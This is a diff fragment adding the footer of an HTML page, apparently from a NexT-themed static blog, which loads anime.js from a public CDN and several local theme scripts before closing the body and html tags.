+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
